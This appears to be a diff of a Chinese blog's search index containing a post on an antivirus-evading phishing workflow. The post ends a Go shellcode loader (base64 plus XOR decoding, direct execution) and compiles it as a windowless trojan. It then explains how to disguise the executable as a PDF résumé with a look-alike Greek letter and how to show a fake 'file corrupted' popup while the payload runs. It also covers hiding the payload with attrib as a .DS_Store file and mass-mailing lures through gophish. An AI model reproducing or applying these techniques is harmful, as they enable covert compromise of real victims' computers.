class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DD</span><span class="params">(src <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">ss, _ := base64.StdEncoding.DecodeString(src)</span><br><span class="line"><span class="keyword">var</span> shellcode []<span class="type">byte</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(ss); i++ &#123;</span><br><span class="line">shellcode = <span class="built_in">append</span>(shellcode, ss[i]^kk[<span class="number">1</span>]^kk[<span class="number">2</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shellcode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译生成可执行文件shell.exe</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go build -ldflags=&quot;-s -w -H=windowsgui&quot; shell.go</span><br></pre></td></tr></table></figure>
+<p><img src="image-20230604163030198.png" alt="image-20230604163030198"></p>
+<p>双击后可发现木马成功上线（2023.6.4测试）</p>
+<p><img src="image-20230604163823173.png" alt="image-20230604163823173"></p>
+<h1 id="伪装">伪装</h1>
+<p>要想让鱼上钩就必须做好伪装,发送一个shell.exe只有傻子才会点,所以我们一般将文件伪装成一个pdf文档发送</p>
+<p>给受害者</p>
+<h2 id="pdf图标-命名">pdf图标+命名</h2>
+<p>使用<code>iconsext.exe</code>提取一个电脑上自带的pdf图标,我这里选择edge的pdf图标,得到对应的ico文件</p>
+<p>再利用<code>ico替换.exe</code>将shell.exe的图标替换</p>
+<p><img src="image-20230604170107321.png" alt="image-20230604170107321"></p>
+<p>接下来改个后缀,这里不能直接使用pdf.exe,也不能使用空格填充,因为360发现这种文件会直接查杀,所以我们可以找个特殊字符来替换pdf,并且让文件名字尽可能的长,尽量让受害者注意不到最后的exe,这里使用希腊字母的Ρ来代替,名字改为<code>xxxx大学_xxxx学院_xxxx专业_xxxxx个人简历.ΡDF.exe</code></p>
+<h2 id="文档报错">文档报错</h2>
+<p>可以利用GoFileBinder将shell.exe和一个正常的pdf文档绑定起来,打开exe后是一个正常的pdf文件,同时机器也会在后台悄悄上线,但如果我们钓鱼的目标不一样,那么对应打卡的pdf文档也要不一样,有的是一份简历,有的是一份通告……所以最方便的方法就是让受害者打开pdf后直接弹窗报错</p>
+<p>这里使用MessageBoxW这个api,代码如下</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">MessageBoxPlain(<span class="string">&quot;提示&quot;</span>, <span class="string">&quot;文件已损坏,无法打开&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MessageBoxPlain</span><span class="params">(title, caption <span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> (</span><br><span class="line">        NULL = <span class="number">0</span></span><br><span class="line">        MB_OK = <span class="number">0</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> MessageBox(NULL, caption, title, MB_OK)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MessageBox</span><span class="params">(hwnd <span class="type">uintptr</span>, caption, title <span class="type">string</span>, flags <span class="type">uint</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    ret, _, _ := syscall.NewLazyDLL(<span class="string">&quot;user32.dll&quot;</span>).NewProc(<span class="string">&quot;MessageBoxW&quot;</span>).Call(</span><br><span class="line">        <span class="type">uintptr</span>(hwnd),</span><br><span class="line">        <span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))),</span><br><span class="line">        <span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),</span><br><span class="line">        <span class="type">uintptr</span>(flags))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="type">int</span>(ret)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>效果：</p>
+<p><img src="image-20230604164839058.png" alt="image-20230604164839058"></p>
+<p>将上述代码写入到shell.go中即可实现弹窗（位置要在syscall.Syscall(addr, 0, 0, 0, 0)上方,要先弹窗再执行shellcode）</p>
+<h2 id="隐藏文件">隐藏文件</h2>
+<p>.DS_Store（Desktop Services Store）文件是苹果公司操作系统 macOS 下用于存储目录的自定义属性和元数据的隐藏文件。这些属性和元数据包括文件夹的位置、图标、背景和视图选项等信息,可以帮助操作系统快速访问和渲染文件夹。在 macOS 的 Finder 中,每个文件夹都有一个与之对应的 .DS_Store 文件,它会随着文件夹的创建、打开、关闭和移动等操作而被创建或更新。</p>
+<p>这里将shellcode代码文件命名为.DS_Store就是为了减少受害者使用解压软件浏览压缩包时的疑心</p>
+<p>可以将.DS_Store文件设为隐藏文件来达到解压完后文件消失的效果,但是如果受害者开启了“查看隐藏项目”,那将会暴露该文件,可以使用以下命令将文件进行进一步的隐藏</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">attrib +S +H .DS_Store</span><br></pre></td></tr></table></figure>
+<p>这下就算开了“查看隐藏项目”也无法看到隐藏的文件</p>
+<p><img src="image-20230604173322404.png" alt="image-20230604173322404"></p>
+<p>这时候就可以打个压缩包发给受害者了（windows自带的压缩功能无法压缩的话使用WinRAR等第三方工具）</p>
+<p>效果：</p>
+<p><img src="image-20230604173628947.png" alt="image-20230604173628947"></p>
+<p><img src="image-20230604173846465.png" alt="image-20230604173846465"></p>
+<h1 id="钓鱼平台">钓鱼平台</h1>
+<p>这里使用gophish搭建钓鱼平台,详细的搭建指南可以查看<a href="http://blog.leanote.com/post/snowming/a6b66097bccd">这篇文章</a></p>
+<p>利用gophish我们可以自定义发件人和批量发送邮件到目标邮箱</p>
+<p>效果截图</p>
+<p><img src="image-20230604214339030.png" alt="image-20230604214339030"></p>
+<p>参考：</p>
+<p><a href="https://xz.aliyun.com/t/11885#toc-4">记一个常规的免杀钓鱼流程</a></p>
 ]]></content>
       <categories>
-        <category>经历</category>
+        <category>技术</category>
       </categories>
       <tags>
-        <tag>ipv6</tag>
-        <tag>服务器</tag>
+        <tag>免杀</tag>
+        <tag>社工</tag>
       </tags>
   </entry>
 </search>
